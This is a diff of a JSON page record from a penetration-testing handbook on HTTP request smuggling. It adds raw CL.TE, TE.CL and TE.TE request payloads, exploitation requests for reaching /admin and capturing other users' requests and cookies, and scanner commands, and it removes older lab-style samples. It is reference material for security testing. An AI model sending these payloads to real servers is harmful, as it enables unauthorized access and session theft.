@@ -12,67 +12,105 @@
     ],
     "sections": [
         {
-            "heading": "General",
-            "type": "paragraph",
-            "content": "{% hint style=\"info\" %}\nHTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers: Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.\n{% endhint %}"
+            "type": "hint",
+            "variant": "info",
+            "content": "HTTP Request Smuggling is a technique for interfering with how a website processes sequences of HTTP requests. It typically involves manipulating the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers to cause desynchronization between front-end and back-end servers."
+        },
+        {
+            "heading": "Basic Vectors",
+            "type": "code_block",
+            "content": [
+                "# 1. CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)",
+                "POST / HTTP/1.1",
+                "Host: vulnerable-website.com",
+                "Content-Length: 13",
+                "Transfer-Encoding: chunked",
+                "",
+                "0",
+                "",
+                "SMUGGLED",
+                "",
+                "# 2. TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)",
+                "POST / HTTP/1.1",
+                "Host: vulnerable-website.com",
+                "Content-Length: 3",
+                "Transfer-Encoding: chunked",
+                "",
+                "8",
+                "SMUGGLED",
+                "0",
+                "",
+                "# 3. TE.TE (Both use Transfer-Encoding, but one can be obfuscated)",
+                "Transfer-Encoding: chunked",
+                "Transfer-Encoding: xchunked"
+            ]
+        },
+        {
+            "heading": "Exploitation Scenarios",
+            "type": "code_block",
+            "content": [
+                "# Bypassing Front-end Security Controls",
+                "POST / HTTP/1.1",
+                "Host: vulnerable-website.com",
+                "Content-Length: 49",
+                "Transfer-Encoding: chunked",
+                "",
+                "0",
+                "",
+                "GET /admin HTTP/1.1",
+                "Host: vulnerable-website.com",
+                "Foo: x",
+                "",
+                "# Capturing Other Users' Requests",
+                "POST / HTTP/1.1",
+                "Host: vulnerable-website.com",
+                "Content-Length: 150",
+                "Transfer-Encoding: chunked",
+                "",
+                "0",
+                "",
+                "POST /comment HTTP/1.1",
+                "Host: vulnerable-website.com",
+                "Cookie: session=...",
+                "Content-Length: 100",
+                "",
+                "comment="
+            ]
         },
         {
             "heading": "Tools",
             "type": "code_block",
             "content": [
-                "# https://github.com/defparam/smuggler",
+                "# HTTP Request Smuggler (Burp Extension - Recommended)",
+                "Search for 'HTTP Request Smuggler' in BApp Store",
+                "",
+                "# Smuggler (Python)",
                 "python3 smuggler.py -u <URL>",
-                "# https://github.com/defparam/tiscripts",
                 "",
-                "# https://github.com/anshumanpattnaik/http-request-smuggling/",
-                "python3 smuggle.py -u <URL>",
+                "# H2C Smuggler (HTTP/2 over Cleartext)",
+                "go run ./cmd/h2csmuggler check https://target.com/ http://localhost",
                 "",
-                "# https://github.com/assetnote/h2csmuggler",
-                "go run ./cmd/h2csmuggler check https://google.com/ http://localhost",
-                "",
-                "",
-                "# HTTP/2",
-                "# https://github.com/BishopFox/h2csmuggler"
+                "# Turbo Intruder Scripts",
+                "https://github.com/defparam/tiscripts"
             ]
-        },
-        {
-            "heading": "Samples",
-            "type": "paragraph",
-            "content": "``http\n- The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:\nPOST /search HTTP/1.1\nHost: normal-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11\nq=smuggling\n- The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:\nPOST /search HTTP/1.1\nHost: normal-website.com\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\nb\nq=smuggling\n0\n• CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.\n◇ Find - time delay:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 4\n1\nA\nX\n• TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.\n◇ Find time delay:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 6\n0\nX\n• TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.\n- CL.TE\nUsing Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: your-lab-id.web-security-academy.net\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n0\nG\nThe second response should say: Unrecognized method GPOST.\n- TE.CL\nIn Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.\nUsing Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: your-lab-id.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0\n- TE.TE: obfuscating TE Header\nIn Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.\nUsing Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: your-lab-id.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0\n``\n../../.gitbook/assets/20200520131941\\[1].jpg"
         }
     ],
     "images": [
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2021-03-24T14:18:23.540Z",
+        "last_updated": "2026-04-22T17:59:35Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/request-smuggling.md",
         "previous_page": {
             "title": "Clickjacking",
             "url": "/enumeration/web/clickjacking"
         },
         "next_page": {
-            "title": "Web Sockets",
-            "url": "/enumeration/web/web-sockets"
+            "title": "Broken Links",
+            "url": "/enumeration/web/broken-links"
         }
     }
 }
